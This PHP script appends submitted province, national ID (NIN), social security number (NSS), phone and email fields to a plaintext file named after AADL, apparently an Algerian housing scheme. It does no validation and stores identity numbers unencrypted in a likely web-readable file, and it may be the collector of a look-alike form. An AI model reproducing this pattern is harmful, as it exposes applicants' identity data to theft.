<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form data
    $province = $_POST['province'];
    $nin = $_POST['nin'];
    $nss = $_POST['nss'];
    $phone = $_POST['phone'];
    $email = $_POST['email'];

    // Prepare data to be saved
    $data = "Province: $province\nNIN: $nin\nNSS: $nss\nPhone: $phone\nEmail: $email\n\n";

    // Define the file path
    $filePath = 'aadl_form_data.txt';

    // Save the data to the file
    file_put_contents($filePath, $data, FILE_APPEND | LOCK_EX);
    
    // Return success response
    echo "Data saved successfully.";
} else {
    echo "Invalid request.";
}
?>
